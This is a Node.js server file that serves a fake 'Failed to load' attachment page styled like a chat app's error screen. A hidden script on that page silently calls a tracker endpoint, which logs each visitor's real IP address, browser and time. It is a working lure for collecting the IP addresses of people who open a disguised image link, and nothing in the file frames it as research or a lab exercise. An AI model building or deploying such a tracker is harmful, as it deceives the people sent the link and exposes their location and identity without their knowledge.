// This is a simple Node.js server
const http = require('http');

const server = http.createServer((req, res) => {
    
    // If the request is to the root (/), serve the HTML file
    if (req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Failed to load</title>
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                        background-color: #36393f;
                        color: #ffffff;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        text-align: center;
                    }
                    .container { max-width: 400px; padding: 20px; }
                    h1 { font-size: 20px; margin-bottom: 10px; }
                    p { font-size: 14px; color: #b9bbbe; }
                    .icon { width: 64px; height: 64px; margin-bottom: 16px; fill: #b9bbbe; }
                </style>
            </head>
            <body>
                <div class="container">
                    <svg class="icon" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-6h2v6zm4 0h-2v-6h2v6z"/>
                    </svg>
                    <h1>Failed to load</h1>
                    <p>We couldn't load this attachment. Please check your connection and try again.</p>
                    <p style="font-size: 12px; margin-top: 20px; color: #dcddde;">Attachment: image.png</p>
                </div>
                <!-- Script to send data to the tracker -->
                <script>
                    fetch('/api/tracker')
                        .then(res => console.log('Data sent successfully!'))
                        .catch(err => console.error('Error:', err));
                </script>
            </body>
            </html>
        `);
    } 
    // If the request is to /api/tracker, log the visitor info
    else if (req.url === '/api/tracker') {
        // Get the real IP address (works even behind proxies like Vercel)
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        console.log('=== VISITOR DETECTED ===');
        console.log('IP Address:', ip);
        console.log('Browser:', req.headers['user-agent']);
        console.log('Time:', new Date().toString());
        console.log('================================');
        
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Success');
    } 
    // For anything else, just send the HTML again
    else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>Failed to load</title></head>
            <body>
                <h1>Failed to load</h1>
                <p>Check your connection.</p>
            </body>
            </html>
        `);
    }
});

// Start the server on port 3000
server.listen(3000, () => {
    console.log('Server is running on port 3000');
    console.log('Waiting for visitors...');
});
